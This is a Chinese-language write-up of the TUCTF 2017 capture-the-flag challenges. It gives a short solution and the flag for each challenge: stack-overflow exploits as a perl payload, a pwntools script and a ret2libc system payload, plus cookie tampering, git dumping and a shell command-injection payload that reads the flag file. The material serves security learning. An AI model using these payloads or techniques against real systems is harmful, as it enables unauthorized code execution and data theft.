# TUCTF 2017


## vuln chat

第一個scanf %30s

可以控到第二個scanf的format string

然後第二個scanf蓋夠長就能直接蓋到main的return address

payload:

`perl -e 'print "A"x20,"%90s\n","A"x49,"\x6B\x85\x04\x08\n"'`

`TUCTF{574ck_5m45h1n6_l1k3_4_pr0}`


## vuln chat 2.0

直接蓋最後兩bytes

跳到print_flag

exp:

```
from pwn import *

r = remote('vulnchat2.tuctf.com', 4242)

r.sendline('aaa')
sleep(1)
r.send('a'*43 + "\x72\x86")

r.interactive()
```


## guestbook

直接read第6個，可以把一些dest渣渣和system給leak出來 (system在20~24)

然後直接change name去改dest，因為gets可以讀無限長

所以理論上可以直接蓋到return address

但要注意中間有東西會被蓋壞 (strcpy那邊)

跟一下可以發現

這邊應該是index被蓋掉了

蓋回0就行

```
   0x5655597d <main+443>:   call   0x56555550 <gets@plt>
   0x56555982 <main+448>:    add    esp,0x4
   0x56555985 <main+451>: mov    eax,DWORD PTR [ebp-0x34]
=> 0x56555988 <main+454>:  mov    eax,DWORD PTR [ebp+eax*4-0x2c]
   0x5655598c <main+458>:  lea    edx,[ebp-0x98]
   0x56555992 <main+464>:   push   edx
   0x56555993 <main+465>:    push   eax
   0x56555994 <main+466>: call   0x56555570 <strcpy@plt>
```

index的offset的話就是 0x98 - 0x34


除了這邊，還有一個地方會爛：

正常：

```
   0x5655598c <main+458>:       lea    edx,[ebp-0x98]
   0x56555992 <main+464>:       push   edx
   0x56555993 <main+465>:       push   eax
=> 0x56555994 <main+466>:       call   0x56555570 <strcpy@plt>
   0x56555999 <main+471>:       add    esp,0x8
   0x5655599c <main+474>:       jmp    0x565559b3 <main+497>
   0x5655599e <main+476>:       mov    BYTE PTR [ebp-0x9],0x0
   0x565559a2 <main+480>:       jmp    0x565559b3 <main+497>
Guessed arguments:
     arg[0]: 0x56558008 --> 0x61 ('a')      <===========  我一開輸入的第0個是a，現在要去change它
     arg[1]: 0xffffd540 --> 0xffff0078 --> 0x0
```

不正常：

```
   0x5656e98c <main+458>:       lea    edx,[ebp-0x98]
   0x5656e992 <main+464>:       push   edx
   0x5656e993 <main+465>:       push   eax
=> 0x5656e994 <main+466>:       call   0x5656e570 <strcpy@plt>
   0x5656e999 <main+471>:       add    esp,0x8
   0x5656e99c <main+474>:       jmp    0x5656e9b3 <main+497>
   0x5656e99e <main+476>:       mov    BYTE PTR [ebp-0x9],0x0
   0x5656e9a2 <main+480>:       jmp    0x5656e9b3 <main+497>
Guessed arguments:
     arg[0]: 0x0                           <============   這個炸惹
     arg[1]: 0xff9675b0 --> 0x0
```


改用 `r.sendline("\x00"*108 + p32(0xdeadbeef)*1 + p32(0) * 11 + p32(system_addr) + p32(sh) * 2)` 後：

```
Guessed arguments:
     arg[0]: 0xdeadbeef                    <============  108 ~ 112的位置
     arg[1]: 0xffbb7ad0 --> 0x0
```

最後用前面leak出來的渣渣塞回去，讓他不會炸就行惹

`r.sendline("\x00"*108 + p32(data1) * 1 + p32(0xdeadbeef) * 11 + p32(system_addr) + p32(sh) * 2)`


## The nerver ending crypto

英文+特殊符號的凱薩加密

共50回合


`TUCTF{wh0_w@s_her3_la5t_ye@r?!?}`


## High source

從source code可以找到密碼

view-source:http://highsource.tuctf.com/scripts/login.js

password: `I4m4M4st3rC0d3rH4x0rsB3w43`

`TUCTF{H1gh_S0urc3_3qu4ls_L0ng_F4ll} `


## Cookie Duty 

cookie: `not_admin: 1 -> 0`

`TUCTF{D0nt_Sk1p_C00k13_Duty}`


## Git Gud

dump /.git

`git reset 22f63ceab55efe05c5448676a3470b13b6545f74`

`git diff`

`TUCTF{D0nt_Us3_G1t_0n_Web_S3rv3r}`


## Cookie Harrelson

cookie中可以看到一串base64

decode後發現是cat index.txt

踹踹看送cat flag可以發現前面會加上註解

用\n cat flag就可以繞過 (要先base64，再塞進cookie)


## iframe and shame

payload:

`search=https://youtube.com/watch?v=qqqasda";cat flag|head -1; "`

`TUCTF{D0nt_Th1nk_H4x0r$_C4nt_3sc4p3_Y0ur_Pr0t3ct10ns}`

![img](https://github.com/w181496/CTF/blob/master/tuctf-2017/iframe.png)

## Funmail

直接strings或ida pro 找username, password

username = john galt
password = this-password-is-a-secret-to-everyone!

就能登入看flag


## Funmail2.0

直接gdb跑，隨便下個斷點，然後跳過去print_flag

`TUCTF{l0c4l_<_r3m073_3x3cu710n}`

## I'm playing

登入discord即可看到flag

